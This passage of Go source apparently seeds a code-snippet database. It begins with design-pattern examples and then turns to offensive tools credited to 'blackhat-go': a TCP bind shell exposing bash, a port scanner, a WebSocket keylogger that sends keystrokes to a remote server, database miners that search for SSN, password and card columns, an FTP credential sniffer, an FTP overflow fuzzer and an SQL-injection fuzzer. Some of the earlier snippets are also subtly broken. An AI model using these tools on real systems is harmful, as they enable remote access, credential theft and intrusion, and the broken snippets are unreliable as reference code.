a := &NoticeSentSpecification{&BaseSpecification{}}\n  a.Relate(a)\n  return a\n}\n// Invoice has already been sent to the collection agency.\ntype InCollectionSpecification struct {\n  Specification\n}\n// Check specification\nfunc (self *InCollectionSpecification) IsSatisfiedBy(elm Invoice) bool {\n  return !elm.IsSent\n}\n// Constructor\nfunc NewInCollectionSpecification() Specification {\n  a := &InCollectionSpecification{&BaseSpecification{}}\n  a.Relate(a)\n  return a\n}\n\nfunc TestSpecification(t *testing.T) {\n  overDue := NewOverDueSpecification()\n  noticeSent := NewNoticeSentSpecification()\n  inCollection := NewInCollectionSpecification()\n  sendToCollection := overDue.And(noticeSent).And(inCollection.Not())\n  invoice := Invoice{\n    Day:    31,    // >= 30\n    Notice: 4,     // >= 3\n    IsSent: false, // false\n  }\n  // true!\n  result := sendToCollection.IsSatisfiedBy(invoice)\n  if !result {\n    t.Errorf(\"Expect result to equal %v, but %v.\\n\", false, true)\n  }\n}")
	create(db, "Idiom functional options in constructor\n(tags: idiom functional options constructor)\n---\n\nhttps://github.com/tmrts/go-patterns\n\nFunctional options are a method of implementing clean/eloquent APIs in Go. Options implemented as a function set the state of that option.\n\ntype Options struct {\n  UID         int\n  GID         int\n  Flags       int\n  Contents    string\n  Permissions os.FileMode\n}\n\ntype Option func(*Options)\n\nfunc UID(userID int) Option {\n  return func(args *Options) {\n    args.UID = userID\n  }\n}\nfunc GID(groupID int) Option {\n  return func(args *Options) {\n    args.GID = groupID\n  }\n}\nfunc Contents(c string) Option {\n  return func(args *Options) {\n    args.Contents = c\n  }\n}\nfunc Permissions(perms os.FileMode) Option {\n  return func(args *Options) {\n    args.Permissions = perms\n  }\n}\n\nfunc New(filepath string, setters ...Option) error {\n  // Default Options\n  args := &Options{\n    UID:         os.Getuid(),\n    GID:         os.Getgid(),\n    Contents:    \"\",\n    Permissions: 0644,\n    Flags:       os.O_CREATE | os.O_EXCL | os.O_WRONLY,\n  }\n  for _, setter := range setters {\n    setter(args)\n  }\n  f, err := os.OpenFile(filepath, args.Flags, args.Permissions)\n  if err != nil {\n    return err\n  } else {\n    defer f.Close()\n  }\n  if _, err := f.WriteString(args.Contents); err != nil {\n    return err\n  }\n  return f.Chown(args.UID, args.GID)\n}\n\nfunc main() {\n  New(\"empty.txt\")\n  New(\"file.txt\", UID(1000), Contents(\"Lorem Ipsum Dolor Amet\"))\n}")
	create(db, "Pattern FanIn\n(tags: pattern fanin merge)\n---\n\nhttps://github.com/tmrts/go-patterns\n\nFan-In is a messaging pattern used to create a funnel for work amongst workers (clients: source, server: destination).\n\nWe can model fan-in using the Go channels.\n\npackage main\n\nimport (\n  \"fmt\"\n  \"sync\"\n  \"time\"\n)\n\n// Merge different channels in one channel\nfunc Merge(cs ...<-chan int) <-chan int {\n  var wg sync.WaitGroup\n  out := make(chan int)\n  // Start an send goroutine for each input channel in cs. send\n  // copies values from c to out until c is closed, then calls wg.Done.\n  send := func(c <-chan int) {\n    for n := range c {\n      out <- n\n    }\n    wg.Done()\n  }\n  wg.Add(len(cs))\n  for _, c := range cs {\n    go send(c)\n  }\n  // Start a goroutine to close out once all the send goroutines are\n  // done.  This must start after the wg.Add call.\n  go func() {\n    wg.Wait()\n    close(out)\n  }()\n  return out\n}\n\nfunc main() {\n  ch1 := make(chan int, 3)\n  ch2 := make(chan int, 3)\n  go func() {\n    for i := 0; i < 3; i++ {\n      ch1 <- i\n    }\n  }()\n  go func() {\n    for i := 0; i < 3; i++ {\n      ch2 <- i\n    }\n  }()\n  ch3 := Merge(ch1, ch2)\n\n  // without goroutine there will be deadlock!\n  \n  //go func() {\n  //  for val := range ch3 {\n  //    fmt.Println(val)\n  //  }\n  //}()\n\n  go func() {\n    for {\n      select {\n      case val := <- ch3:\n        fmt.Println(val)\n      }\n    }\n  }()\n  time.Sleep(time.Second)\n}")
	create(db, "Pattern FanOut\n(tags: pattern fanout split)\n---\n\nhttps://github.com/tmrts/go-patterns\n\nFan-Out is a messaging pattern used for distributing work amongst workers (producer: source, consumers: destination).\n\nWe can model fan-out using the Go channels.\n\npackage main\n\nimport (\n  \"fmt\"\n  \"time\"\n)\n\n// Split a channel into n channels that receive messages in a round-robin fashion.\nfunc Split(ch <-chan int, n int) []chan int {\n  cs := make([]chan int, 0, n)\n  for i := 0; i < n; i++ {\n    cs = append(cs, make(chan int))\n  }\n  // Distributes the work in a round robin fashion among the stated number\n  // of channels until the main channel has been closed. In that case, close\n  // all channels and return.\n  distributeToChannels := func(ch <-chan int, cs []chan int) {\n    // Close every channel when the execution ends.\n    //defer func(cs []chan int) {\n    //  for _, c := range cs {\n    //    close(c)\n    //  }\n    //}(cs)\n    for {\n      for _, c := range cs {\n        select {\n        case val, ok := <-ch:\n          if !ok {\n            return\n          }\n\n          c <- val\n        }\n      }\n    }\n  }\n\n  go distributeToChannels(ch, cs)\n\n  return cs\n}\n\nfunc main() {\n  ch1 := make(chan int, 6)\n  go func() {\n    for i := 0; i < 6; i++ {\n      ch1 <- i\n    }\n  }()\n  chs := Split(ch1, 2)\n\n  go func() {\n    for {\n      select {\n      case val := <-chs[0]:\n        fmt.Println(val)\n      case val := <-chs[1]:\n        fmt.Println(val)\n      default:\n      }\n    }\n  }()\n  time.Sleep(time.Second)\n}")
	create(db, "Pattern Circuit breaker\n(tags: pattern circuit breaker)\n---\n\nhttps://github.com/tmrts/go-patterns\n\nSimilar to electrical fuses that prevent fires when a circuit that is connected to the electrical grid starts drawing a high amount of power which causes the wires to heat up and combust, the circuit breaker design pattern is a fail-first mechanism that shuts down the circuit, request/response relationship or a service in the case of software development, to prevent bigger failures.\n\ncircuit.Counter is a simple counter that records success and failure states of a circuit along with a timestamp and calculates the consecutive number of failures.\n\nCircuit is wrapped using the circuit.Breaker closure that keeps an internal operation counter. It returns a fast error if the circuit has failed consecutively more than the specified threshold. After a while it retries the request and records it.\n\nNote: Context type is used here to carry deadlines, cancelation signals, and other request-scoped values across API boundaries and between processes.\n\npackage main\n\nimport (\n  \"fmt\"\n  \"io/ioutil\"\n  \"log\"\n  \"net/http\"\n\n  \"github.com/sony/gobreaker\"\n)\n\n// Get wraps http.Get in CircuitBreaker.\nfunc Get(cb *gobreaker.CircuitBreaker, url string) ([]byte, error) {\n  body, err := cb.Execute(func() (interface{}, error) {\n    resp, err := http.Get(url)\n    if err != nil {\n      return nil, err\n    }\n    defer resp.Body.Close()\n    body, err := ioutil.ReadAll(resp.Body)\n    if err != nil {\n      return nil, err\n    }\n    return body, nil\n  })\n  if err != nil {\n    return nil, err\n  }\n  return body.([]byte), nil\n}\n\nfunc main() {\n  var st gobreaker.Settings\n  st.Name = \"HTTP GET\"\n  st.ReadyToTrip = func(counts gobreaker.Counts) bool {\n    failureRatio := float64(counts.TotalFailures) / float64(counts.Requests)\n    return counts.Requests >= 3 && failureRatio >= 0.6\n  }\n  cb := gobreaker.NewCircuitBreaker(st)\n  \n  body, err := Get(cb, \"http://www.google.com/robots.txt\")\n  if err != nil {\n    log.Fatal(err)\n  }\n\n  fmt.Println(string(body))\n}")
	create(db, "Pattern Semaphore\n(tags: pattern semaphore)\n---\n\nhttps://github.com/tmrts\n\nA semaphore is a synchronization pattern/primitive that imposes mutual exclusion on a limited number of resources.\n\npackage main\n\nimport (\n  \"errors\"\n  \"fmt\"\n  \"time\"\n)\n\nvar (\n  ErrNoTickets      = errors.New(\"semaphore: could not aquire semaphore\")\n  ErrIllegalRelease = errors.New(\"semaphore: can't release the semaphore without acquiring it first\")\n)\n\n// Interface contains the behavior of a semaphore that can be acquired and/or released.\ntype Interface interface {\n  Acquire() error\n  Release() error\n}\n\ntype implementation struct {\n  sem     chan struct{}\n  timeout time.Duration\n}\n\nfunc (s *implementation) Acquire() error {\n  select {\n  case s.sem <- struct{}{}:\n    return nil\n  case <-time.After(s.timeout):\n    return ErrNoTickets\n  }\n}\n\nfunc (s *implementation) Release() error {\n  select {\n  case _ = <-s.sem:\n    return nil\n  case <-time.After(s.timeout):\n    return ErrIllegalRelease\n  }\n  return nil\n}\n\nfunc New(tickets int, timeout time.Duration) Interface {\n  return &implementation{\n    sem:     make(chan struct{}, tickets),\n    timeout: timeout,\n  }\n}\n\nfunc main() {\n  // if tickets = 1 and timeout < 3*time.Second there will be a panic \"semaphore: could not aquire semaphore\"\n  tickets, timeout := 3, time.Second\n  s := New(tickets, timeout)\n  for i := 0; i < 3; i++{\n    go func(i int) {\n      if err := s.Acquire(); err != nil {\n        panic(err)\n      }\n      time.Sleep(1 * time.Second)\n      fmt.Println(\"work\", i)\n      if err := s.Release(); err != nil {\n        panic(err)\n      }\n    }(i)\n  }\n  time.Sleep(4 * time.Second)\n}")
	create(db, "Create file with svg image\n(tags: file svg image)\n---\n\npackage main\n\nimport \"github.com/ajstarks/svgo\"\n\nfunc main() {\n  f, err := os.Create(\"1.svg\") \n  canvas := svg.New(io.Writer(f))\n  canvas.Start(800, 600)\n  txtOpt := \"text-anchor:left;font-family:monospace;font-size:16px;fill:black\"\n  lineOpt := \"fill:none;stroke-width:2px;stroke:rgb(0,255,0)\"\n  rectOpt := \"fill:white;stroke-width:6px;stroke:rgb(0,255,255)\"\n  p.canvas.Roundrect(10, 10, 100, 30, 10, 10, rectOpt)\n  p.canvas.Text(50, 50, \"some text\", txtOpt)\n  p.canvas.Qbez(10, 20, 30, 40, 50, 60, lineOpt)\n  p.canvas.End()\n}")
	create(db, "Server with svg image in response\n(tags: server svg image)\n---\n\npackage main\n\nimport \"github.com/ajstarks/svgo\"\n\nfunc main() {\n  http.Handle(\"/circle\", http.HandlerFunc(circle))\n  err := http.ListenAndServe(\":2003\", nil)\n}\n\nfunc circle(w http.ResponseWriter, req *http.Request) {\n  w.Header().Set(\"Content-Type\", \"image/svg+xml\")\n  s := svg.New(w)\n  s.Start(500, 500)\n  s.Circle(250, 250, 125, \"fill:none;stroke:black\")\n  s.End()\n}")
	create(db, "Reader and writer std in and out\n(tags: reader writer std in out)\n---\n\nhttps://github.com/blackhat-go\n\npackage main\n\nimport (\n  \"fmt\"\n  \"io\"\n  \"log\"\n  \"os\"\n)\n\n// FooReader defines an io.Reader to read from stdin.\ntype FooReader struct{}\n\n// Read reads data from stdin.\nfunc (fooReader *FooReader) Read(b []byte) (int, error) {\n  fmt.Print(\"in > \")\n  return os.Stdin.Read(b)\n}\n\n// FooWriter defines an io.Writer to write to Stdout.\ntype FooWriter struct{}\n\n// Write writes data to Stdout.\nfunc (fooWriter *FooWriter) Write(b []byte) (int, error) {\n  fmt.Print(\"out> \")\n  return os.Stdout.Write(b)\n}\n\nfunc main() {\n  // Instantiate reader and writer.\n  var (\n    reader FooReader\n    writer FooWriter\n  )\n\n  if _, err := io.Copy(&writer, &reader); err != nil {\n    log.Fatalln(\"Unable to read/write data\")\n  }\n}")
	create(db, "Tcp echo server\n(tags: tcp server)\n---\n\nhttps://github.com/blackhat-go\n\npackage main\n\nimport (\n  \"io\"\n  \"log\"\n  \"net\"\n)\n\n// echo is a handler function that simply echoes received data.\nfunc echo(conn net.Conn) {\n  defer conn.Close()\n\n  // Create a buffer to store received data.\n  b := make([]byte, 512)\n  for {\n    // Receive data via conn.Read into a buffer.\n    size, err := conn.Read(b[0:])\n    if err == io.EOF {\n      log.Println(\"Client disconnected\")\n      break\n    }\n    if err != nil {\n      log.Println(\"Unexpected error\")\n      break\n    }\n    log.Printf(\"Received %d bytes: %s\", size, string(b))\n\n    // Send data via conn.Write.\n    log.Println(\"Writing data\")\n    if _, err := conn.Write(b[0:size]); err != nil {\n      log.Fatalln(\"Unable to write data\")\n    }\n  }\n}\n\nfunc main() {\n  // Bind to TCP port 20080 on all interfaces.\n  listener, err := net.Listen(\"tcp\", \":20080\")\n  if err != nil {\n    log.Fatalln(\"Unable to bind to port\")\n  }\n  log.Println(\"Listening on 0.0.0.0:20080\")\n  for {\n    // Wait for connection. Create net.Conn on connection established.\n    conn, err := listener.Accept()\n    log.Println(\"Received connection\")\n    if err != nil {\n      log.Fatalln(\"Unable to accept connection\")\n    }\n    // Handle the connection. Using goroutine for concurrency.\n    go echo(conn)\n  }\n}")
	create(db, "Remote shell\n(tags: tcp shell remote std in out exec)\n---\n\nhttps://github.com/blackhat-go\n\npackage main\n\nimport (\n  \"io\"\n  \"log\"\n  \"net\"\n  \"os/exec\"\n)\n\nfunc handle(conn net.Conn) {\n  /*\n   * Explicitly calling /bin/sh and using -i for interactive mode\n   * so that we can use it for stdin and stdout.\n   * For Windows use exec.Command(\"cmd.exe\")\n   */\n  //cmd := exec.Command(\"cmd.exe\")\n  //cmd := exec.Command(\"/bin/sh\", \"-i\")\n  cmd := exec.Command(\"/bin/bash\", \"-i\")\n  //cmd := exec.Command(\"pwd\")\n  rp, wp := io.Pipe()\n  // Set stdin to our connection\n  cmd.Stdin = conn\n  cmd.Stdout = wp\n  cmd.Stderr = wp\n  go io.Copy(conn, rp)\n  cmd.Run()\n  conn.Close()\n}\n\nfunc main() {\n  listener, err := net.Listen(\"tcp\", \":20080\")\n  if err != nil {\n    log.Fatalln(err)\n  }\n  for {\n    conn, err := listener.Accept()\n    if err != nil {\n      log.Fatalln(err)\n    }\n    go handle(conn)\n  }\n}")
	create(db, "Port scanner\n(tags: port scanner)\n---\n\nhttps://github.com/blackhat-go\n\npackage main\n\nimport (\n  \"fmt\"\n  \"net\"\n  \"sort\"\n)\n\nfunc worker(ports, results chan int) {\n  for p := range ports {\n    address := fmt.Sprintf(\"scanme.nmap.org:%d\", p)\n    conn, err := net.Dial(\"tcp\", address)\n    if err != nil {\n      results <- 0\n      continue\n    }\n    conn.Close()\n    results <- p\n  }\n}\n\nfunc main() {\n  ports := make(chan int, 100)\n  results := make(chan int)\n  var openports []int\n\n  for i := 0; i < cap(ports); i++ {\n    go worker(ports, results)\n  }\n\n  go func() {\n    for i := 1; i <= 1024; i++ {\n      ports <- i\n    }\n  }()\n\n  for i := 0; i < 1024; i++ {\n    port := <-results\n    if port != 0 {\n      openports = append(openports, port)\n    }\n  }\n\n  close(ports)\n  close(results)\n  sort.Ints(openports)\n  for _, port := range openports {\n    fmt.Printf(\"%d open\\n\", port)\n  }\n}")
	create(db, "Websocket keylogger\n(tags: websocket keylogger)\n---\n\nhttps://github.com/blackhat-go\n\n1. For example use a site jsbin.com\n2. Insert there\n\n<!DOCTYPE html>\n<html>\n<head><title>Login</title></head>\n<body>\n<script src='http://localhost:8080/k.js'></script>\n<form action='/login' method='post'><input name='username'/> <input name='password'/> <input type=\"submit\"/></form>\n</body>\n</html>\n\n3. In main.go write\n\npackage main\n\nimport (\n  \"flag\"\n  \"fmt\"\n  \"html/template\"\n  \"log\"\n  \"net/http\"\n\n  \"github.com/gorilla/mux\"\n  \"github.com/gorilla/websocket\"\n)\n\nvar (\n  upgrader = websocket.Upgrader{\n    CheckOrigin: func(r *http.Request) bool { return true },\n  }\n\n  listenAddr string\n  wsAddr     string\n  jsTemplate *template.Template\n)\n\nfunc init() {\n  flag.StringVar(&listenAddr, \"listen-addr\", \"\", \"Address to listen on\")\n  flag.StringVar(&wsAddr, \"ws-addr\", \"\", \"Address for WebSocket connection\")\n  flag.Parse()\n  var err error\n  jsTemplate, err = template.ParseFiles(\"logger.js\")\n  if err != nil {\n    panic(err)\n  }\n}\n\nfunc serveWS(w http.ResponseWriter, r *http.Request) {\n  conn, err := upgrader.Upgrade(w, r, nil)\n  if err != nil {\n    http.Error(w, \"\", 500)\n    return\n  }\n  defer conn.Close()\n  fmt.Printf(\"Connection from %s\\n\", conn.RemoteAddr().String())\n  for {\n    _, msg, err := conn.ReadMessage()\n    if err != nil {\n      return\n    }\n    fmt.Printf(\"From %s: %s\\n\", conn.RemoteAddr().String(), string(msg))\n  }\n}\n\nfunc serveFile(w http.ResponseWriter, r *http.Request) {\n  w.Header().Set(\"Content-Type\", \"application/javascript\")\n  jsTemplate.Execute(w, wsAddr)\n}\n\nfunc main() {\n  r := mux.NewRouter()\n  r.HandleFunc(\"/ws\", serveWS)\n  r.HandleFunc(\"/k.js\", serveFile)\n  log.Fatal(http.ListenAndServe(\":8080\", r))\n}\n\n4. In logger.js write\n\n(function() {\n    var conn = new WebSocket(\"ws://{{.}}/ws\");\n    document.onkeypress = keypress;\n    function keypress(evt) {\n        s = String.fromCharCode(evt.which);\n        conn.send(s);\n    }\n})();\n\n// example of output in serever if someone tapping on the site\nFrom 127.0.0.1:41488: d\nFrom 127.0.0.1:41488: f\nFrom 127.0.0.1:41488: g")
	create(db, "Database miner for mongo\n(tags: db miner mongo schema)\n---\n\nhttps://github.com/blackhat-go\n\n// dbminer.go\npackage main\n\nimport (\n  \"fmt\"\n  \"regexp\"\n)\n\ntype DatabaseMiner interface {\n  GetSchema() (*Schema, error)\n}\n\ntype Schema struct {\n  Databases []Database\n}\n\ntype Database struct {\n  Name   string\n  Tables []Table\n}\n\ntype Table struct {\n  Name    string\n  Columns []string\n}\n\nfunc Search(m DatabaseMiner) error {\n  s, err := m.GetSchema()\n  if err != nil {\n    return err\n  }\n  re := getRegex()\n  for _, database := range s.Databases {\n    for _, table := range database.Tables {\n      for _, field := range table.Columns {\n        for _, r := range re {\n          if r.MatchString(field) {\n            fmt.Println(database)\n            fmt.Printf(\"[+] HIT: %s\\n\", field)\n          }\n        }\n      }\n    }\n  }\n  return nil\n}\n\nfunc getRegex() []*regexp.Regexp {\n  return []*regexp.Regexp{\n    regexp.MustCompile(`(?i)social`),\n    regexp.MustCompile(`(?i)ssn`),\n    regexp.MustCompile(`(?i)pass(word)?`),\n    regexp.MustCompile(`(?i)hash`),\n    regexp.MustCompile(`(?i)ccnum`),\n    regexp.MustCompile(`(?i)card`),\n    regexp.MustCompile(`(?i)security`),\n    regexp.MustCompile(`(?i)key`),\n  }\n}\n\nfunc (s Schema) String() string {\n  var ret string\n  for _, database := range s.Databases {\n    ret += fmt.Sprint(database.String() + \"\\n\")\n  }\n  return ret\n}\n\nfunc (d Database) String() string {\n  ret := fmt.Sprintf(\"[DB] = %+s\\n\", d.Name)\n  for _, table := range d.Tables {\n    ret += table.String()\n  }\n  return ret\n}\n\nfunc (t Table) String() string {\n  ret := fmt.Sprintf(\"    [TABLE] = %+s\\n\", t.Name)\n  for _, field := range t.Columns {\n    ret += fmt.Sprintf(\"       [COL] = %+s\\n\", field)\n  }\n  return ret\n}\n\n// main.go\npackage main\n\nimport (\n  \"os\"\n  \"gopkg.in/mgo.v2\"\n  \"gopkg.in/mgo.v2/bson\"\n)\n\ntype MongoMiner struct {\n  Host    string\n  session *mgo.Session\n}\n\nfunc New(host string) (*MongoMiner, error) {\n  m := MongoMiner{Host: host}\n  err := m.connect()\n  if err != nil {\n    return nil, err\n  }\n  return &m, nil\n}\n\nfunc (m *MongoMiner) connect() error {\n  s, err := mgo.Dial(m.Host)\n  if err != nil {\n    return err\n  }\n  m.session = s\n  return nil\n}\n\nfunc (m *MongoMiner) GetSchema() (*dbminer.Schema, error) {\n  var s = new(dbminer.Schema)\n\n  dbnames, err := m.session.DatabaseNames()\n  if err != nil {\n    return nil, err\n  }\n\n  for _, dbname := range dbnames {\n    db := dbminer.Database{Name: dbname, Tables: []dbminer.Table{}}\n    collections, err := m.session.DB(dbname).CollectionNames()\n    if err != nil {\n      return nil, err\n    }\n\n    for _, collection := range collections {\n      table := dbminer.Table{Name: collection, Columns: []string{}}\n\n      var docRaw bson.Raw\n      err := m.session.DB(dbname).C(collection).Find(nil).One(&docRaw)\n      if err != nil {\n        return nil, err\n      }\n\n      var doc bson.RawD\n      if err := docRaw.Unmarshal(&doc); err != nil {\n        if err != nil {\n          return nil, err\n        }\n      }\n\n      for _, f := range doc {\n        table.Columns = append(table.Columns, f.Name)\n      }\n      db.Tables = append(db.Tables, table)\n    }\n    s.Databases = append(s.Databases, db)\n  }\n  return s, nil\n}\n\nfunc main() {\n  mm, err := New(os.Args[1])\n  if err != nil {\n    panic(err)\n  }\n  if err := Search(mm); err != nil {\n    panic(err)\n  }\n}")
	create(db, "Database miner for mysql\n(tags: db miner mysql schema)\n---\n\nhttps://github.com/blackhat-go\n\n// dbminer.go\npackage main\n\nimport (\n  \"fmt\"\n  \"regexp\"\n)\n\ntype DatabaseMiner interface {\n  GetSchema() (*Schema, error)\n}\n\ntype Schema struct {\n  Databases []Database\n}\n\ntype Database struct {\n  Name   string\n  Tables []Table\n}\n\ntype Table struct {\n  Name    string\n  Columns []string\n}\n\nfunc Search(m DatabaseMiner) error {\n  s, err := m.GetSchema()\n  if err != nil {\n    return err\n  }\n  re := getRegex()\n  for _, database := range s.Databases {\n    for _, table := range database.Tables {\n      for _, field := range table.Columns {\n        for _, r := range re {\n          if r.MatchString(field) {\n            fmt.Println(database)\n            fmt.Printf(\"[+] HIT: %s\\n\", field)\n          }\n        }\n      }\n    }\n  }\n  return nil\n}\n\nfunc getRegex() []*regexp.Regexp {\n  return []*regexp.Regexp{\n    regexp.MustCompile(`(?i)social`),\n    regexp.MustCompile(`(?i)ssn`),\n    regexp.MustCompile(`(?i)pass(word)?`),\n    regexp.MustCompile(`(?i)hash`),\n    regexp.MustCompile(`(?i)ccnum`),\n    regexp.MustCompile(`(?i)card`),\n    regexp.MustCompile(`(?i)security`),\n    regexp.MustCompile(`(?i)key`),\n  }\n}\n\nfunc (s Schema) String() string {\n  var ret string\n  for _, database := range s.Databases {\n    ret += fmt.Sprint(database.String() + \"\\n\")\n  }\n  return ret\n}\n\nfunc (d Database) String() string {\n  ret := fmt.Sprintf(\"[DB] = %+s\\n\", d.Name)\n  for _, table := range d.Tables {\n    ret += table.String()\n  }\n  return ret\n}\n\nfunc (t Table) String() string {\n  ret := fmt.Sprintf(\"    [TABLE] = %+s\\n\", t.Name)\n  for _, field := range t.Columns {\n    ret += fmt.Sprintf(\"       [COL] = %+s\\n\", field)\n  }\n  return ret\n}\n\n// main.go\npackage main\n\nimport (\n  \"database/sql\"\n  \"fmt\"\n  \"log\"\n  \"os\"\n\n  _ \"github.com/go-sql-driver/mysql\"\n  \"github.com/blackhat-go/bhg/ch-7/db/dbminer\"\n)\n\ntype MySQLMiner struct {\n  Host string\n  Db   sql.DB\n}\n\nfunc New(host string) (*MySQLMiner, error) {\n  m := MySQLMiner{Host: host}\n  err := m.connect()\n  if err != nil {\n    return nil, err\n  }\n  return &m, nil\n}\n\nfunc (m *MySQLMiner) connect() error {\n\n  db, err := sql.Open(\"mysql\", fmt.Sprintf(\"root:password@tcp(%s:3306)/information_schema\", m.Host))\n  if err != nil {\n    log.Panicln(err)\n  }\n  m.Db = *db\n  return nil\n}\n\nfunc (m *MySQLMiner) GetSchema() (*dbminer.Schema, error) {\n  var s = new(dbminer.Schema)\n\n  sql := `SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME FROM columns\n  WHERE TABLE_SCHEMA NOT IN ('mysql', 'information_schema', 'performance_schema', 'sys')\n  ORDER BY TABLE_SCHEMA, TABLE_NAME`\n  schemarows, err := m.Db.Query(sql)\n  if err != nil {\n    return nil, err\n  }\n  defer schemarows.Close()\n\n  var prevschema, prevtable string\n  var db dbminer.Database\n  var table dbminer.Table\n  for schemarows.Next() {\n    var currschema, currtable, currcol string\n    if err := schemarows.Scan(&currschema, &currtable, &currcol); err != nil {\n      return nil, err\n    }\n\n    if currschema != prevschema {\n      if prevschema != \"\" {\n        db.Tables = append(db.Tables, table)\n        s.Databases = append(s.Databases, db)\n      }\n      db = dbminer.Database{Name: currschema, Tables: []dbminer.Table{}}\n      prevschema = currschema\n      prevtable = \"\"\n    }\n\n    if currtable != prevtable {\n      if prevtable != \"\" {\n        db.Tables = append(db.Tables, table)\n      }\n      table = dbminer.Table{Name: currtable, Columns: []string{}}\n      prevtable = currtable\n    }\n    table.Columns = append(table.Columns, currcol)\n  }\n  db.Tables = append(db.Tables, table)\n  s.Databases = append(s.Databases, db)\n  if err := schemarows.Err(); err != nil {\n    return nil, err\n  }\n\n  return s, nil\n}\n\nfunc main() {\n  mm, err := New(os.Args[1])\n  if err != nil {\n    panic(err)\n  }\n  defer mm.Db.Close()\n  if err := dbminer.Search(mm); err != nil {\n    panic(err)\n  }\n}")
	create(db, "Using pcap for finding all devices\n(tags: pcap device find)\n---\n\nhttps://github.com/blackhat-go\n\n// sudo apt install libpcap-dev\n\npackage main\n\nimport (\n  \"fmt\"\n  \"log\"\n  \"github.com/google/gopacket/pcap\"\n)\n\nfunc main() {\n  devices, err := pcap.FindAllDevs()\n  if err != nil {\n    log.Panicln(err)\n  }\n\n  for _, device := range devices {\n    fmt.Println(device.Name)\n    for _, address := range device.Addresses {\n      fmt.Printf(\"    IP:      %s\\n\", address.IP)\n      fmt.Printf(\"    Netmask: %s\\n\", address.Netmask)\n    }\n  }\n}")
	create(db, "Capturing packets and filter them\n(tags: pcap packet filter)\n---\n\nhttps://github.com/blackhat-go\n\npackage main\n\nimport (\n  \"fmt\"\n  \"log\"\n  \"github.com/google/gopacket\"\n  \"github.com/google/gopacket/pcap\"\n)\n\nvar (\n  iface    = \"enp0s5\"\n  snaplen  = int32(1600)\n  promisc  = false\n  timeout  = pcap.BlockForever\n  filter   = \"tcp and port 80\"\n  devFound = false\n)\n\nfunc main() {\n  devices, err := pcap.FindAllDevs()\n  if err != nil {\n    log.Panicln(err)\n  }\n\n  for _, device := range devices {\n    if device.Name == iface {\n      devFound = true\n    }\n  }\n  if !devFound {\n    log.Panicf(\"Device named '%s' does not exist\\n\", iface)\n  }\n\n  handle, err := pcap.OpenLive(iface, snaplen, promisc, timeout)\n  if err != nil {\n    log.Panicln(err)\n  }\n  defer handle.Close()\n\n  if err := handle.SetBPFFilter(filter); err != nil {\n    log.Panicln(err)\n  }\n\n  source := gopacket.NewPacketSource(handle, handle.LinkType())\n  for packet := range source.Packets() {\n    fmt.Println(packet)\n  }\n}")
	create(db, "Inspect payload from ftp packets using pcap\n(tags: pcap packet ftp payload)\n---\n\nhttps://github.com/blackhat-go\n\npackage main\n\nimport (\n  \"bytes\"\n  \"fmt\"\n  \"log\"\n  \"github.com/google/gopacket\"\n  \"github.com/google/gopacket/pcap\"\n)\n\nvar (\n  iface    = \"enp0s5\"\n  snaplen  = int32(1600)\n  promisc  = false\n  timeout  = pcap.BlockForever\n  filter   = \"tcp and dst port 21\"\n  devFound = false\n)\n\nfunc main() {\n  devices, err := pcap.FindAllDevs()\n  if err != nil {\n    log.Panicln(err)\n  }\n\n  for _, device := range devices {\n    if device.Name == iface {\n      devFound = true\n    }\n  }\n  if !devFound {\n    log.Panicf(\"Device named '%s' does not exist\\n\", iface)\n  }\n\n  handle, err := pcap.OpenLive(iface, snaplen, promisc, timeout)\n  if err != nil {\n    log.Panicln(err)\n  }\n  defer handle.Close()\n\n  if err := handle.SetBPFFilter(filter); err != nil {\n    log.Panicln(err)\n  }\n\n  source := gopacket.NewPacketSource(handle, handle.LinkType())\n  for packet := range source.Packets() {\n    appLayer := packet.ApplicationLayer()\n    if appLayer == nil {\n      continue\n    }\n    payload := appLayer.Payload()\n    if bytes.Contains(payload, []byte(\"USER\")) {\n      fmt.Print(string(payload))\n    } else if bytes.Contains(payload, []byte(\"PASS\")) {\n      fmt.Print(string(payload))\n    }\n  }\n}")
	create(db, "Ftp fuzzer\n(tags: ftp fuzzer)\n---\n\nhttps://github.com/blackhat-go\n\npackage main\n\nimport (\n  \"bufio\"\n  \"fmt\"\n  \"log\"\n  \"net\"\n)\n\nfunc main() {\n  for i := 0; i < 2500; i++ {\n    conn, err := net.Dial(\"tcp\", \"10.0.1.20:21\")\n    if err != nil {\n      log.Fatalf(\"[!] Error at offset %d: %s\\n\", i, err)\n    }\n    bufio.NewReader(conn).ReadString('\\n')\n\n    user := \"\"\n    for n := 0; n <= i; n++ {\n      user += \"A\"\n    }\n\n    raw := \"USER %s\\n\"\n    fmt.Fprintf(conn, raw, user)\n    bufio.NewReader(conn).ReadString('\\n')\n\n    raw = \"PASS password\\n\"\n    fmt.Fprint(conn, raw)\n    bufio.NewReader(conn).ReadString('\\n')\n\n    if err := conn.Close(); err != nil {\n      log.Println(\"[!] Unable to close connection. Is service alive?\")\n    }\n  }\n}")
	create(db, "Http sql fuzzer\n(tags: http sql fuzzer)\n---\n\nhttps://github.com/blackhat-go\n\npackage main\n\nimport (\n  \"bytes\"\n  \"fmt\"\n  \"io/ioutil\"\n  \"log\"\n  \"net/http\"\n  \"regexp\"\n)\n\nfunc main() {\n  payloads := []string{\n    \"baseline\",\n    \")\",\n    \"(\",\n    \"\\\"\",\n    \"'\",\n  }\n\n  sqlErrors := []string{\n    \"SQL\",\n    \"MySQL\",\n    \"ORA-\",\n    \"syntax\",\n  }\n\n  errRegexes := []*regexp.Regexp{}\n  for _, e := range sqlErrors {\n    re := regexp.MustCompile(fmt.Sprintf(\".*%s.*\", e))\n    errRegexes = append(errRegexes, re)\n  }\n\n  for _, payload := range payloads {\n    client := new(http.Client)\n    body := []byte(fmt.Sprintf(\"username=%s&password=p\", payload))\n    req, err := http.NewRequest(\n      \"POST\",\n      \"http://10.0.1.20:8080/WebApplication/login.jsp?debug=true\",\n      bytes.NewReader(body),\n    )\n    if err != nil {\n      log.Fatalf(\"[!] Unable to generate request: %s\\n\", err)\n    }\n    req.Header.Add(\"Content-Type\", \"application/x-www-form-urlencoded\")\n    resp, err := client.Do(req)\n    if err != nil {\n      log.Fatalf(\"[!] Unable to process response: %s\\n\", err)\n    }\n    body, err = ioutil.ReadAll(resp.Body)\n    if err != nil {\n      log.Fatalf(\"[!] Unable to read response body: %s\\n\", err)\n    }\n    resp.Body.Close()\n\n    for idx, re := range errRegexes {\n      if re.MatchString(string(body)) {\n        fmt.Printf(\n          \"[+] SQL Error found ('%s') for payload: %s\\n\",\n          sqlErrors[idx],\n          payload,\n        )\n        break\n      }\n    }\n  }\n}")
